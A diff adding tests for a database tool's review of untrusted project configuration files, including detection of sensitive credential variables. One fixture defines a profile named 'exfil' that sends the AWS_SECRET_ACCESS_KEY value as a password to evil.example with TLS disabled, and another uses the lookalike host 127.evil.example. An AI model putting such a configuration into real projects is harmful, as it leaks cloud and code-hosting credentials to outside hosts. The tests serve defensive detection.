@@ -23,7 +23,7 @@ import pytest
 
 from tabrion_studio.api.config import Configuration
 from tabrion_studio.config.files import MAX_FILE_BYTES
-from tabrion_studio.config.project import ProjectConfig, TrustError
+from tabrion_studio.config.project import ProjectConfig, TrustError, sensitive_variable
 from tabrion_studio.config.user import UserConfig
 from tabrion_studio.logs import configure_logging
 from tests.support.access import ORIGIN, Studio, make_studio
@@ -217,6 +217,67 @@ def test_secret_files_inside_project_or_config_are_listed(env: Env) -> None:
     assert {"path": "../elsewhere.db", "kind": "database", "outside": True} in files
     assert {"path": "./secrets/db", "kind": "secret", "outside": False} in files
     assert {"path": str(secret_in_config), "kind": "secret", "outside": True} in files
+
+
+def _pg(name: str, host: str, password: str, sslmode: str | None = None) -> str:
+    tls = "" if sslmode is None else f'sslmode = "{sslmode}"\n'
+    return (
+        f'[[profile]]\nname = "{name}"\nengine = "postgresql"\nhost = "{host}"\ndatabase = "d"\n'
+        f"password = '{password}'\n{tls}environment = \"dev\"\n"
+    )
+
+
+def test_d01_says_where_each_password_goes(env: Env) -> None:
+    """T-5, T-4 (stu-006-review.md) and L-1 (stu-007-review.md): one flow per connection, with its warnings."""
+    secret_in_config = env.config_dir / "prod.pw"
+    text = (
+        "version = 1\n"
+        + _pg("exfil", "evil.example", "env:AWS_SECRET_ACCESS_KEY", "disable")
+        + _pg("local", "localhost", "keyring:")
+        + _pg("ca-only", "db.internal", "env:PGPASSWORD", "verify-ca")
+        + _pg("config-file", "db.internal", f"file:{secret_in_config}")
+        + _pg("named-local", "127.evil.example", "env:GITHUB_TOKEN")
+    )
+    env.write(text)
+    doc = env.project_doc()
+    connections = {c["name"]: c for c in doc["review"]["connections"]}
+    assert connections["exfil"]["flow"] == {
+        "secret": "env:AWS_SECRET_ACCESS_KEY",
+        "to": "evil.example:5432",
+        "tls": "disable",
+    }
+    assert connections["exfil"]["warnings"] == ["remote_host", "weak_tls", "sensitive_variable"]
+    assert connections["local"]["flow"] == {"secret": "keyring:", "to": "localhost:5432", "tls": "prefer"}
+    assert connections["local"]["warnings"] == []
+    assert connections["ca-only"]["warnings"] == ["remote_host", "weak_tls"]  # verify-ca checks no host name
+    assert connections["config-file"]["warnings"] == ["remote_host", "secret_outside"]
+    # A DNS name that starts with 127 is remote (T-4), and the default TLS mode for it is verify-full.
+    assert connections["named-local"]["flow"]["tls"] == "verify-full"
+    assert connections["named-local"]["warnings"] == ["remote_host", "sensitive_variable"]
+
+
+def test_sqlite_connections_have_no_flow(env: Env) -> None:
+    env.write(GOOD)
+    connections = {c["name"]: c for c in env.project_doc()["review"]["connections"]}
+    assert "flow" not in connections["parts-dev"] and "flow" in connections["measure-central"]
+
+
+@pytest.mark.parametrize(
+    ("name", "sensitive"),
+    [
+        ("PGPASSWORD", False),
+        ("DB_PASSWORD", False),
+        ("PARTS_PG_PASSWORD", False),
+        ("AWS_SECRET_ACCESS_KEY", True),
+        ("GITHUB_TOKEN", True),
+        ("gh_token", True),
+        ("MY_API_KEY", True),
+        ("CLIENT_SECRET", True),
+        ("SSH_AUTH_SOCK", True),
+    ],
+)
+def test_sensitive_variables(name: str, sensitive: bool) -> None:
+    assert sensitive_variable(name) is sensitive
 
 
 @pytest.mark.skipif(not POSIX, reason="symlinks")
